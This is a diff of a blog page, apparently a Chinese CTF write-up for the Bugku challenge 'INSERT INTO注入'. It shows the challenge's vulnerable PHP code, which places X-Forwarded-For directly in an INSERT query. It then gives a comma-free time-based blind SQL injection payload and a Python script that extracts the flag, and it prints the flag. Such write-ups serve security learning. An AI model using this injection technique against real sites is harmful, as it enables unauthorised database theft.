@@ -103,7 +103,7 @@
 
 
 
-  <meta name="keywords" content="AbelChe" />
+  <meta name="keywords" content="Web,Bugku,X_FORWARDED_FOR注入," />
 
 
 
@@ -114,17 +114,18 @@
 
 
 
-<meta name="description" content="Youth means limitless possibilities.">
-<meta name="keywords" content="AbelChe">
-<meta property="og:type" content="website">
-<meta property="og:title" content="AbelChe&#39;s Blog">
-<meta property="og:url" content="http://AbelChe.com/tags/Bugku/index.html">
+<meta name="description" content="题目地址http://120.24.86.145:8002/web15/ 题目给了源码123456789101112131415161718192021222324252627error_reporting(0);function getIp()&amp;#123;	$ip = &apos;&apos;;	if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&amp;#123;		$ip = $_S">
+<meta name="keywords" content="Web,Bugku,X_FORWARDED_FOR注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WP-Bugku-INSERT INTO注入">
+<meta property="og:url" content="http://AbelChe.com/2018/08/19/Writeup/WP-Bugku-INSERT INTO注入/index.html">
 <meta property="og:site_name" content="AbelChe&#39;s Blog">
-<meta property="og:description" content="Youth means limitless possibilities.">
+<meta property="og:description" content="题目地址http://120.24.86.145:8002/web15/ 题目给了源码123456789101112131415161718192021222324252627error_reporting(0);function getIp()&amp;#123;	$ip = &apos;&apos;;	if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&amp;#123;		$ip = $_S">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-08-19T08:02:58.798Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="AbelChe&#39;s Blog">
-<meta name="twitter:description" content="Youth means limitless possibilities.">
+<meta name="twitter:title" content="WP-Bugku-INSERT INTO注入">
+<meta name="twitter:description" content="题目地址http://120.24.86.145:8002/web15/ 题目给了源码123456789101112131415161718192021222324252627error_reporting(0);function getIp()&amp;#123;	$ip = &apos;&apos;;	if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&amp;#123;		$ip = $_S">
 
 
 
@@ -154,13 +155,13 @@
 
 
 
-  <link rel="canonical" href="http://AbelChe.com/tags/Bugku/"/>
+  <link rel="canonical" href="http://AbelChe.com/2018/08/19/Writeup/WP-Bugku-INSERT INTO注入/"/>
 
 
 
 
 
-  <title>标签: Bugku | AbelChe's Blog</title>
+  <title>WP-Bugku-INSERT INTO注入 | AbelChe's Blog</title>
   
 
 
@@ -179,7 +180,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -327,310 +328,297 @@
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block tag">
-
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h2>Bugku<small>标签</small>
-        </h2>
-      </div>
-
-      
-        
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://AbelChe.com/2018/08/19/Writeup/WP-Bugku-INSERT INTO注入/">
 
-      <h3 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="AbelChe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/images/head.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AbelChe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/2018/08/19/Writeup/WP-Bugku-INSERT INTO注入/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-INSERT INTO注入</span>
-              
-            </a>
         
-      </h3>
+          <h2 class="post-title" itemprop="name headline">WP-Bugku-INSERT INTO注入</h2>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-19T14:07:46+08:00"
-              content="2018-08-19" >
-          08-19
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-19T14:07:46+08:00">
+                2018-08-19
+              </time>
+            
 
-    </header>
-  </article>
+            
+              <span class="post-meta-divider">|</span>
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2018-08-19T16:02:58+08:00">
+                2018-08-19
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/WriteUp/" itemprop="url" rel="index">
+                    <span itemprop="name">WriteUp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i> 阅读数
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  373 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/18/Writeup/WP-Bugku-各种绕过/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-各种绕过</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-18T16:56:10+08:00"
-              content="2018-08-18" >
-          08-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
 
       
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/18/Writeup/WP-Bugku-文件上传2-湖湘杯/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-文件上传2(湖湘杯)</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-18T16:14:32+08:00"
-              content="2018-08-18" >
-          08-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/17/Writeup/WP-Bugku-求getshell/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-求getshell</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-17T18:02:08+08:00"
-              content="2018-08-17" >
-          08-17
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/17/Writeup/WP-Bugku-文件包含2/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-文件包含2</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-17T14:32:54+08:00"
-              content="2018-08-17" >
-          08-17
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/17/Writeup/WP-Bugku-login3-SKCTF/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-login3(SKCTF)</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-17T11:01:27+08:00"
-              content="2018-08-17" >
-          08-17
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/16/Writeup/WP-Bugku-细心/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-细心</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-16T16:03:35+08:00"
-              content="2018-08-16" >
-          08-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/16/Writeup/WP-Bugku-web8/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-web8</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-16T14:55:40+08:00"
-              content="2018-08-16" >
-          08-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/16/Writeup/WP-Bugku-程序员本地网站/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-程序员本地网站</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-16T14:26:46+08:00"
-              content="2018-08-16" >
-          08-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-      
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h3 class="post-title">
-        
-            <a class="post-title-link" href="/2018/08/16/Writeup/WP-Bugku-flag.php/" itemprop="url">
-              
-                <span itemprop="name">WP-Bugku-flag.php</span>
-              
-            </a>
-        
-      </h3>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-08-16T13:03:25+08:00"
-              content="2018-08-16" >
-          08-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+        <p>题目地址<a href="http://120.24.86.145:8002/web15/" target="_blank" rel="noopener">http://120.24.86.145:8002/web15/</a></p>
+<p>题目给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$ip = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure></p>
+<p>这是X_FORWARDED_FOR注入，但是过滤了<code>,</code>在<code>,</code>被过滤的情况下，无法使用<code>if</code>语句<br>当然在mysql下除了if还有<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> xxx <span class="keyword">then</span> xxx <span class="keyword">else</span> xxx <span class="keyword">end</span>;</span><br></pre></td></tr></table></figure></p>
+<p>而且由于,被过滤，无法使用substr和substring，但是这里可以使用from 1 for 1替代，最后payload如下<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11'+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">substr</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'a'</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<p>python 脚本<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string </span><br><span class="line"></span><br><span class="line">mystring = string.ascii_letters+string.digits</span><br><span class="line">url='http://120.24.86.145:8002/web15/'</span><br><span class="line">data = "127.0.0.1'+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> (<span class="keyword">substring</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag) <span class="keyword">from</span> &#123;<span class="number">0</span>&#125; <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'&#123;1&#125;'</span>) <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span>) <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1"  #这里的&#123;&#125;对应的是后面所需要的format</span></span><br><span class="line"><span class="string">flag = ''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(1,35):</span></span><br><span class="line"><span class="string">    for j in mystring:</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            headers = &#123;'</span>x-forwarded-<span class="keyword">for</span><span class="string">':data.format(str(i),j)&#125;</span></span><br><span class="line"><span class="string">            res = requests.get(url,headers=headers,timeout=3)</span></span><br><span class="line"><span class="string">        except requests.exceptions.ReadTimeout:</span></span><br><span class="line"><span class="string">            flag += j</span></span><br><span class="line"><span class="string">            print flag</span></span><br><span class="line"><span class="string">            break</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print '</span>The <span class="keyword">final</span> flag:<span class="string">'+flag</span></span><br></pre></td></tr></table></figure></p>
+<p>这个代码的原理就是利用127.0.0.1+true/false去进行判断，如果是true，就与超时相违背，从而执行下面except的代码。</p>
+<p>得到 flag{cdbf14c9551d5be5612f7bb5d2867853}</p>
 
       
     </div>
+    
+    
+    
 
+    
+      <div>
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="/uploads/images/wechatQR_2.JPG" alt="AbelChe wechat" style="width: 200px; max-width: 100%;"/>
+    <div>扫码加微信</div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>Donate here!!!</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.png" alt="AbelChe 微信支付"/>
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="AbelChe 支付宝"/>
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    AbelChe
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://AbelChe.com/2018/08/19/Writeup/WP-Bugku-INSERT INTO注入/" title="WP-Bugku-INSERT INTO注入">http://AbelChe.com/2018/08/19/Writeup/WP-Bugku-INSERT INTO注入/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/Bugku/" rel="tag"># Bugku</a>
+          
+            <a href="/tags/X-FORWARDED-FOR注入/" rel="tag"># X_FORWARDED_FOR注入</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div id="needsharebutton-postbottom">
+            <span class="btn">
+              <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </span>
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/18/Writeup/WP-Bugku-各种绕过/" rel="next" title="WP-Bugku-各种绕过">
+                <i class="fa fa-chevron-left"></i> WP-Bugku-各种绕过
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/tags/Bugku/page/2/">2</a><a class="page-number" href="/tags/Bugku/page/3/">3</a><a class="extend next" rel="next" href="/tags/Bugku/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -638,6 +626,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -981,6 +973,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
